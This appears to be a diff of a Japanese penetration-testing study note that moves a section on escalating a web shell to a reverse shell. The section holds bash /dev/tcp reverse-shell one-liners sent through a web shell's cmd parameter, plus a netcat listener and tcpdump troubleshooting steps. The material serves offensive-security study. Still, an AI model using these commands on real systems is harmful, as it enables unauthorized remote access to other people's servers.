@@ -3,35 +3,6 @@
 
 ---
 
-# WebShellからReverse Shellへの展開
-
-- Kali にはデフォルトで`/usr/share/WebShells`にプログラム言語ごとにさまざまなリバースシェルペイロードが用意されている
-- [Reverse Shell Generator](https://www.revshells.com/)を使うのが簡単
-
-🐧Linux：Web shell上に以下のコマンドをエンコードて実行する
-```zsh
-<url>?cmd=bash -c 'bash -i >& /dev/tcp/<AttackerIP>/443 0>&1'
-```
-- エンコード方法はターゲット環境に応じて異なる
-- 基本はBurp SuiteのHackVertorを使って、"url_encode_not_plus"する
-
-🪟Windows：[[What is the shell#Base64化したPowerShellリバースシェルワンライナー]]
-
-
-Reverse Shell を実行したのに接続が確立しない場合、FWなどにより遮断されていないか、問題の切り分けに使う
-```zsh
-# Attacker
-sudo tcpdump -nni any host <AttackerIP> and port 4444
-sudo nc -lvnp 4444
-
-# Target Web shell
-<url>?cmd=bash -c 'bash -i >& /dev/tcp/<AttackerIP>/4444 0>&1'
-```
-- 何も表示されない場合は、コマンドが実行されていないか、FWで遮断
-- SYNパケットのみ届く場合は、ポート番号が誤っている
-
----
-
 # Web Shellの基本
 
 ## 特徴・用途
@@ -63,6 +34,35 @@ sudo nc -lvnp 4444
 	- ※ 複数クエリの場合は、`&`も使う：`index.php?path=hoge.txt&cmd=whoami`
 ![[Pasted image 20230320131618.png]]
 $$WebShell実行例$$
+
+---
+
+# WebShellからReverse Shellへの展開
+
+- Kali にはデフォルトで`/usr/share/WebShells`にプログラム言語ごとにさまざまなリバースシェルペイロードが用意されている
+- [Reverse Shell Generator](https://www.revshells.com/)を使うのが簡単
+
+🐧Linux：Web shell上に以下のコマンドをエンコードて実行する
+```zsh
+<url>?cmd=bash -c 'bash -i >& /dev/tcp/<AttackerIP>/443 0>&1'
+```
+- エンコード方法はターゲット環境に応じて異なる
+- 基本はBurp SuiteのHackVertorを使って、"url_encode_not_plus"する
+
+🪟Windows：[[What is the shell#Base64化したPowerShellリバースシェルワンライナー]]
+
+
+Reverse Shell を実行したのに接続が確立しない場合、FWなどにより遮断されていないか、問題の切り分けに使う
+```zsh
+# Attacker
+sudo tcpdump -nni any host <AttackerIP> and port 4444
+sudo nc -lvnp 4444
+
+# Target Web shell
+<url>?cmd=bash -c 'bash -i >& /dev/tcp/<AttackerIP>/4444 0>&1'
+```
+- 何も表示されない場合は、コマンドが実行されていないか、FWで遮断
+- SYNパケットのみ届く場合は、ポート番号が誤っている
 
 ---
 
